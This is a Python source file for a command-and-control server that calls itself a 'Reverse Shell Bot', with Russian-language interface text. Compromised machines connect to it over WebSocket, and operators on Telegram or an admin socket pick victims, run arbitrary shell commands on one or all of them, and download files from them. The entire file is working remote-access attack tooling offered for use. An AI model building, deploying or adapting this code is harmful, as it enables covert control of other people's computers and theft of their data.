#!/usr/bin/env python3
import asyncio
import json
import os
import signal
import sys
from datetime import datetime

from aiohttp import web, WSMsgType
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ALLOWED_USERS = [int(x.strip()) for x in os.environ.get("ALLOWED_USERS", "").split(",") if x.strip()]
LISTENER_PORT = int(os.environ.get("PORT", os.environ.get("LISTENER_PORT", "8080")))

clients = {}
current_client = None
bot_app = None
interactive_mode = {}


def log(message):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")


async def send_to_telegram(chat_id, text, keyboard=None, parse_mode=None):
    try:
        kwargs = {"chat_id": chat_id, "text": text}
        if keyboard:
            kwargs["reply_markup"] = keyboard
        if parse_mode:
            kwargs["parse_mode"] = parse_mode
        await bot_app.bot.send_message(**kwargs)
    except Exception as e:
        log(f"TG send error: {e}")


async def notify_new_client(chat_id, client_id, addr, info):
    msg = (
        f"\U0001f7e2 **НОВЫЙ КЛИЕНТ ПОДКЛЮЧИЛСЯ!**\n\n"
        f"\U0001f4e1 **ID:** `{client_id}`\n"
        f"\U0001f310 **IP:** `{addr}`\n"
        f"\U0001f4bb **Инфо:** `{info}`\n\n"
        f"\u2705 Статус: Активен\n\n"
        f"Используйте /clients для просмотра"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"Выбрать клиента {client_id}", callback_data=f"select_{client_id}")],
        [InlineKeyboardButton("\U0001f4cb Список клиентов", callback_data="list_clients")]
    ])
    await send_to_telegram(chat_id, msg, kb)


async def ws_handler(request):
    ws = web.WebSocketResponse(max_msg_size=1048576)
    await ws.prepare(request)

    client_id = max(clients.keys()) + 1 if clients else 1

    try:
        msg = await asyncio.wait_for(ws.receive(), timeout=15)
        if msg.type == WSMsgType.TEXT and msg.data.startswith("CLIENT_INFO:"):
            client_info = msg.data.split(":", 1)[1].strip()
        else:
            client_info = "Unknown"
    except (asyncio.TimeoutError, ConnectionError):
        return ws

    addr = request.remote
    clients[client_id] = {"ws": ws, "info": client_info, "addr": addr, "buffer": ""}
    log(f"[+] Client [{client_id}] {addr} - {client_info}")

    global current_client
    was_first = current_client is None
    if was_first:
        current_client = client_id

    for uid in ALLOWED_USERS:
        await notify_new_client(uid, client_id, addr, client_info)
        if was_first:
            await send_to_telegram(uid, f"\u2705 Клиент [{client_id}] выбран как текущий")

    flush_task = asyncio.create_task(buffer_flush_loop(client_id))
    clients[client_id]["flush_task"] = flush_task

    try:
        while True:
            try:
                msg = await asyncio.wait_for(ws.receive(), timeout=120)
            except asyncio.TimeoutError:
                try:
                    await ws.ping()
                except:
                    break
                continue
            if msg.type == WSMsgType.BINARY:
                dl = clients.get(client_id, {}).pop("pending_dl", None)
                if dl:
                    await send_to_telegram(
                        dl["chat_id"],
                        f"📥 Файл `{dl['path']}` ({len(msg.data)} байт)",
                        parse_mode="Markdown",
                    )
                    await bot_app.bot.send_document(
                        chat_id=dl["chat_id"],
                        document=InputFile(BytesIO(msg.data), filename=os.path.basename(dl["path"])),
                    )
            elif msg.type == WSMsgType.TEXT:
                text = msg.data
                if text.startswith("__FILE_ERROR__ "):
                    dl = clients.get(client_id, {}).pop("pending_dl", None)
                    if dl:
                        err = text[len("__FILE_ERROR__ "):]
                        await send_to_telegram(dl["chat_id"], f"❌ `{err}`", parse_mode="Markdown")
                else:
                    cl = clients.get(client_id)
                    if cl:
                        cl["buffer"] += text
            elif msg.type in (WSMsgType.CLOSE, WSMsgType.ERROR):
                break
    except Exception:
        pass

    flush_task.cancel()
    if client_id in clients:
        clients[client_id].pop("flush_task", None)
        del clients[client_id]
        log(f"[-] Client [{client_id}] disconnected")
        for uid in ALLOWED_USERS:
            await send_to_telegram(uid, f"\U0001f534 Клиент [{client_id}] отключился")
        if current_client == client_id:
            current_client = next(iter(clients.keys())) if clients else None
            if current_client:
                for uid in ALLOWED_USERS:
                    await send_to_telegram(uid, f"\U0001f504 Автоматически выбран клиент [{current_client}]")

    return ws


async def buffer_flush_loop(client_id):
    try:
        while client_id in clients:
            await asyncio.sleep(0.5)
            cl = clients.get(client_id)
            if cl and cl["buffer"].strip():
                buf = cl["buffer"]
                cl["buffer"] = ""
                if current_client == client_id:
                    for uid in ALLOWED_USERS:
                        await send_to_telegram(uid, f"```\n{buf.strip()}\n```", parse_mode="Markdown")
    except asyncio.CancelledError:
        pass


async def health_handler(request):
    return web.Response(text="OK")


ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")


async def admin_ws_handler(request):
    global current_client
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    authed = False

    async for msg in ws:
        if msg.type != WSMsgType.TEXT:
            continue
        text = msg.data

        if not authed:
            if text.startswith("auth:") and ADMIN_PASSWORD and text[5:] == ADMIN_PASSWORD:
                authed = True
                await ws.send_str("auth_ok")
            else:
                await ws.send_str("auth_err")
                break
            continue

        if text == "clients":
            lst = [{"id": cid, "addr": c["addr"], "info": c["info"], "current": cid == current_client} for cid, c in clients.items()]
            await ws.send_str(f"clients:{json.dumps(lst)}")

        elif text.startswith("select:"):
            cid = int(text[7:])
            if cid in clients:
                current_client = cid
                await ws.send_str(f"selected:{cid}")
            else:
                await ws.send_str(f"error:Client {cid} not found")

        elif text == "shell":
            if current_client and current_client in clients:
                await ws.send_str("output:--- interactive mode ---")
            else:
                await ws.send_str("error:No client selected")

        elif text == "back":
            await ws.send_str("output:--- exited ---")

        elif text == "info":
            if current_client and current_client in clients:
                c = clients[current_client]
                await ws.send_str(f"output:ID: {current_client} | IP: {c['addr']} | OS: {c['info']}")
            else:
                await ws.send_str("error:No client selected")

        else:
            if current_client and current_client in clients:
                try:
                    await clients[current_client]["ws"].send_str(text + "\n")
                except Exception:
                    await ws.send_str("error:Failed to send command")
            else:
                await ws.send_str("error:No client selected")

    return ws


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        await update.message.reply_text("\u26d4 Доступ запрещен")
        return
    msg = (
        f"\U0001f916 **Reverse Shell Bot (WebSocket)**\n\n"
        f"\u2705 Бот активен\n"
        f"\U0001f4e1 Порт: `{LISTENER_PORT}`\n\n"
        f"**Команды:**\n"
        f"/clients - Список клиентов\n"
        f"/select <id> - Выбрать клиента\n"
        f"/shell - Интерактивный режим\n"
        f"/back - Выйти из интерактива\n"
        f"/exec <cmd> - Выполнить команду\n"
        f"/dl <путь> - Скачать файл\n"
        f"/info - Инфо о клиенте\n"
        f"/broadcast <cmd> - Всем клиентам\n"
        f"/help - Справка\n\n"
        f"**Активных клиентов:** {len(clients)}"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        return
    text = (
        "\U0001f4da **Команды бота:**\n\n"
        "**Управление:**\n"
        "\u2022 `/clients` - Все клиенты\n"
        "\u2022 `/select <id>` - Выбрать клиента\n"
        "\u2022 `/info` - Инфо о текущем\n\n"
        "**Работа:**\n"
        "\u2022 `/shell` - Войти в интерактив\n"
        "\u2022 `/back` - Выйти из интерактива\n"
        "\u2022 `/exec <cmd>` - Выполнить команду\n"
        "\u2022 `/dl <путь>` - Скачать файл с клиента\n\n"
        "**Дополнительно:**\n"
        "\u2022 `/broadcast <cmd>` - Всем клиентам\n\n"
        "**Пример:**\n"
        "`/clients` -> `/select 1` -> `/shell` -> `ls` -> `/back`"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def list_clients(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        return
    if not clients:
        await update.message.reply_text("\u274c Нет активных клиентов")
        return
    msg = "\U0001f4cb **Активные клиенты:**\n\n"
    for cid, c in clients.items():
        mark = "\u27a1\ufe0f " if current_client == cid else "   "
        msg += f"{mark}**ID:** `{cid}`\n   \U0001f310 IP: `{c['addr']}`\n   \U0001f4bb `{c['info'][:50]}`\n\n"
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(f"Выбрать {cid}", callback_data=f"select_{cid}")] for cid in clients])
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb)


async def select_client(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        return
    global current_client
    try:
        if context.args:
            cid = int(context.args[0])
        elif update.callback_query:
            cid = int(update.callback_query.data.split("_")[1])
            await update.callback_query.answer()
        else:
            await update.message.reply_text("\u274c Использование: `/select <id>`", parse_mode="Markdown")
            return
        if cid in clients:
            current_client = cid
            m = f"\u2705 Выбран клиент [{cid}]\n\U0001f310 {clients[cid]['addr']}\n\U0001f4bb {clients[cid]['info']}\n\nИспользуйте `/shell`"
            if update.callback_query:
                await update.callback_query.edit_message_text(m, parse_mode="Markdown")
            else:
                await update.message.reply_text(m, parse_mode="Markdown")
        else:
            await update.message.reply_text(f"\u274c Клиент [{cid}] не найден")
    except Exception:
        await update.message.reply_text("\u274c Ошибка. Использование: `/select <id>`", parse_mode="Markdown")


async def show_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        return
    if not current_client or current_client not in clients:
        await update.message.reply_text("\u274c Нет выбранного клиента")
        return
    c = clients[current_client]
    m = (
        f"\U0001f4ca **Информация о клиенте**\n\n"
        f"\U0001f194 **ID:** `{current_client}`\n"
        f"\U0001f310 **IP:** `{c['addr']}`\n"
        f"\U0001f4bb **ОС:** `{c['info']}`\n"
        f"\u2705 **Статус:** Активен\n\n"
        f"Используйте `/shell` для работы"
    )
    await update.message.reply_text(m, parse_mode="Markdown")


async def shell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        return
    if not current_client or current_client not in clients:
        await update.message.reply_text("\u274c Нет выбранного клиента")
        return
    interactive_mode[uid] = True
    await update.message.reply_text(
        f"\U0001f513 **Интерактивный режим**\nКлиент: [{current_client}]\n\nВсе сообщения -> клиенту.\n`/back` для выхода.",
        parse_mode="Markdown"
    )


async def back_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in interactive_mode:
        del interactive_mode[uid]
        await update.message.reply_text("\U0001f512 Выход из интерактивного режима")
    else:
        await update.message.reply_text("Вы не в интерактивном режиме")


async def exec_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        return
    if not current_client or current_client not in clients:
        await update.message.reply_text("\u274c Нет выбранного клиента")
        return
    if not context.args:
        await update.message.reply_text("\u274c Использование: `/exec <команда>`", parse_mode="Markdown")
        return
    cmd = " ".join(context.args)
    try:
        await clients[current_client]["ws"].send_str(cmd + "\n")
        await update.message.reply_text(f"\u2705 Команда отправлена\n`{cmd}`", parse_mode="Markdown")
    except Exception:
        await update.message.reply_text("\u274c Ошибка отправки команды")


async def dl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        return
    if not current_client or current_client not in clients:
        await update.message.reply_text("❌ Нет выбранного клиента")
        return
    if not context.args:
        await update.message.reply_text("❌ Использование: `/dl <путь>`", parse_mode="Markdown")
        return
    path = " ".join(context.args)
    cl = clients[current_client]
    cl["pending_dl"] = {"chat_id": uid, "path": path}
    try:
        await cl["ws"].send_str(f"__FILE__ {path}")
        await update.message.reply_text(f"📥 Загружаю `{path}`...", parse_mode="Markdown")
    except Exception:
        cl.pop("pending_dl", None)
        await update.message.reply_text("❌ Ошибка отправки команды")


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ALLOWED_USERS:
        return
    if not clients:
        await update.message.reply_text("\u274c Нет активных клиентов")
        return
    if not context.args:
        await update.message.reply_text("\u274c Использование: `/broadcast <команда>`", parse_mode="Markdown")
        return
    cmd = " ".join(context.args)
    sent = 0
    for c in clients.values():
        try:
            await c["ws"].send_str(cmd + "\n")
            sent += 1
        except:
            pass
    await update.message.reply_text(f"\U0001f4e1 Команда отправлена {sent} клиентам\n`{cmd}`", parse_mode="Markdown")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in interactive_mode:
        return
    if not current_client or current_client not in clients:
        await update.message.reply_text("\u274c Клиент отключен")
        del interactive_mode[uid]
        return
    cmd = update.message.text.strip()
    try:
        await clients[current_client]["ws"].send_str(cmd + "\n")
        await update.message.reply_text(f"\U0001f4bb `{cmd}`", parse_mode="Markdown")
    except Exception:
        await update.message.reply_text("\u274c Ошибка отправки")
        del interactive_mode[uid]


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    global current_client
    if query.data.startswith("select_"):
        cid = int(query.data.split("_")[1])
        if cid in clients:
            current_client = cid
            await query.edit_message_text(f"\u2705 Выбран клиент [{cid}]")
        else:
            await query.edit_message_text(f"\u274c Клиент [{cid}] не найден")
    elif query.data == "list_clients":
        if not clients:
            await query.edit_message_text("\u274c Нет активных клиентов")
            return
        msg = "\U0001f4cb **Клиенты:**\n\n"
        for cid, c in clients.items():
            mark = "\u27a1\ufe0f " if current_client == cid else "   "
            msg += f"{mark}**ID:** `{cid}` - {c['addr']}\n"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(f"Выбрать {cid}", callback_data=f"select_{cid}")] for cid in clients])
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)


async def run_telegram_bot():
    global bot_app
    app = Application.builder().token(BOT_TOKEN).build()
    bot_app = app
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("clients", list_clients))
    app.add_handler(CommandHandler("list", list_clients))
    app.add_handler(CommandHandler("select", select_client))
    app.add_handler(CommandHandler("info", show_info))
    app.add_handler(CommandHandler("shell", shell_command))
    app.add_handler(CommandHandler("back", back_command))
    app.add_handler(CommandHandler("exec", exec_command))
    app.add_handler(CommandHandler("dl", dl_command))
    app.add_handler(CommandHandler("download", dl_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await app.initialize()
    await app.start()
    await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
    while True:
        await asyncio.sleep(3600)


async def run_http_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    app.router.add_get("/ws", ws_handler)
    app.router.add_get("/admin/ws", admin_ws_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", LISTENER_PORT)
    await site.start()
    log(f"[*] WS server on port {LISTENER_PORT}")
    while True:
        await asyncio.sleep(3600)


async def main():
    if not BOT_TOKEN:
        print("ERROR: Set BOT_TOKEN env var")
        sys.exit(1)
    if not ALLOWED_USERS:
        print("ERROR: Set ALLOWED_USERS env var (comma-separated IDs)")
        sys.exit(1)
    log("[*] Starting Reverse Shell Bot (WebSocket)")
    log(f"[*] Allowed users: {ALLOWED_USERS}")
    await asyncio.gather(run_telegram_bot(), run_http_server())


if __name__ == "__main__":
    asyncio.run(main())
